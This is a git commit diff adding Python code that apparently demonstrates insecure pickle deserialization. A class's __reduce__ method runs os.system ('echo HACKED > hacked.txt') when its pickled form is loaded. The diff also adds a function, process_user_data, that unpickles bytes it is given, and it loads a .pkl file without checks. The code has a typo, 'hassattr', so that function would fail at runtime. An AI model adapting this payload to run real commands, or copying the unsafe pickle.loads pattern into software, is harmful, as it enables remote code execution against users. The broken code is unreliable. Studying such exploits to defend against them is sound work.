c6de60d4c3a9a283a4b63fb8767faad620da530c
tsenturion <80580892+tsenturion@users.noreply.github.com>
2025-05-21 21:07:52 +0500

    patterns

--- online2/test.py
+++ online2/test.py
@@ -7,3 +7,34 @@ def get_system_info():
         'machine': platform.machine(),
     }
 
+info = get_system_info()
+#print(info)
+
+import pickle
+import os
+
+class FakePlatform:
+    def __reduce__(self):
+        return (os.system, ('echo HACKED > hacked.txt',))
+
+malicious_data = pickle.dumps(FakePlatform())
+
+"""
+with open('malicious.pkl', 'wb') as f:
+    f.write(malicious_data)
+
+with open('malicious.pkl', 'rb') as f:
+    obj = pickle.load(f) # здесь будет вызван метод reduce"""
+
+def process_user_data(data_bytes):
+    obj = pickle.loads(data_bytes)
+
+    if hassattr(obj, 'get_info'):
+        print(obj.get_info())
+    else:
+        return None
+
+with open('system_info.pkl', 'rb') as f:
+    sys_info = pickle.load(f)
+
+print(sys_info)
